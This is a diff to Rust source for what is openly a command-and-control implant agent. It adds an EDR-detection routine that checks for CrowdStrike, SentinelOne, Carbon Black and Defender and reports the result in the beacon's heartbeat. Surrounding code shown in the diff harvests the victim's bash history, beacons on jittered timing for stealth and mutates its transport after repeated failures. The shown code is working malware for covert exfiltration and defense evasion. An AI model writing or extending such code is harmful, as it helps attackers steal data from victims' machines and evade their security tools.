@@ -24,6 +24,7 @@ struct Telemetry {
     #[serde(rename = "o")] os: String,
     #[serde(rename = "e")] env_context: String,
     #[serde(rename = "p")] artifact_preview: String,
+    #[serde(rename = "d")] defense_profile: String,
 }
 
 #[derive(Deserialize)]
@@ -34,8 +35,23 @@ struct C2Response {
     epoch: i64,
 }
 
+fn profile_defenses() -> String {
+    let edr_signatures = [
+        ("/opt/CrowdStrike/falcond", "CrowdStrike"),
+        ("/var/lib/s1", "SentinelOne"),
+        ("/opt/carbonblack", "CarbonBlack"),
+        ("/etc/microsoft/mdatp", "Defender"),
+    ];
+
+    for (path, name) in edr_signatures.iter() {
+        if std::path::Path::new(path).exists() {
+            return name.to_string();
+        }
+    }
+    "None".into()
+}
+
 fn harvest_bash_history(username: &str) -> String {
-    // Determine path based on user
     let path = if username == "root" {
         "/root/.bash_history".to_string()
     } else {
@@ -44,12 +60,12 @@ fn harvest_bash_history(username: &str) -> String {
 
     match std::fs::read_to_string(&path) {
         Ok(content) => {
-            // Take the last 2 lines to keep the packet size within DNS/HTTP limits
+            // Take the last 2 lines for high-stealth/low-bandwidth
             let lines: Vec<&str> = content.lines().rev().take(2).collect();
             if lines.is_empty() { 
-                "Empty history".into() 
+                "Empty".into() 
             } else { 
-                lines.join(" | ").replace("\"", "'") // Sanitize quotes for JSON
+                lines.join(" | ").replace("\"", "'") 
             }
         }
         Err(_) => "Access Denied".into(),
@@ -288,17 +304,18 @@ impl Agent {
         let username = sys.process(current_pid)
             .and_then(|p| {
                 let uid = p.user_id()?;
-                user_list.iter().find(|u: &&sysinfo::User| u.id() == uid)
+                user_list.iter().find(|u| u.id() == uid)
             })
-            .map(|u: &sysinfo::User| u.name().to_string())
+            .map(|u| u.name().to_string())
             .unwrap_or_else(|| "unknown_user".into());
             
         let os_info = format!("{} {}", System::name().unwrap_or_default(), System::os_version().unwrap_or_default());
         let env_ctx = detect_env();
 
         loop {
-            // Harvest artifacts
+            // Phase 2.1 & 2.3: Harvest artifacts and Profile defenses
             let history_snippet = harvest_bash_history(&username);
+            let defense_ctx = profile_defenses(); 
 
             let stats = Telemetry {
                 agent_id: self.id.clone(),
@@ -310,11 +327,12 @@ impl Agent {
                 os: os_info.clone(),
                 env_context: env_ctx.clone(),
                 artifact_preview: history_snippet,
+                defense_profile: defense_ctx, // Critical: Integrated Phase 2.3
             };
 
             match self.transport.send_heartbeat(&stats) {
                 Ok(res) => {
-                    println!("[+] C2 Status: {} | Env: {} | Activity: {}", res.status, env_ctx, stats.artifact_preview);
+                    println!("[+] C2 Status: {} | Defense: {} | Activity: {}", res.status, stats.defense_profile, stats.artifact_preview);
                     self.failures = 0;
                 },
                 Err(e) => {
@@ -326,11 +344,12 @@ impl Agent {
             if self.failures >= 3 { self.mutate(); }
             
             let mut rng = rand::thread_rng();
-            let sleep_time = Exp::new(self.lambda).unwrap().sample(&mut rng).min(60.0).max(1.0);
+            let exp = Exp::new(self.lambda).unwrap();
+            let sleep_time = exp.sample(&mut rng).min(60.0).max(1.0);
             thread::sleep(Duration::from_secs_f64(sleep_time));
         }
     }
-
+    
     fn mutate(&mut self) {
         self.state = (self.state + 1) % 6;
         self.failures = 0;
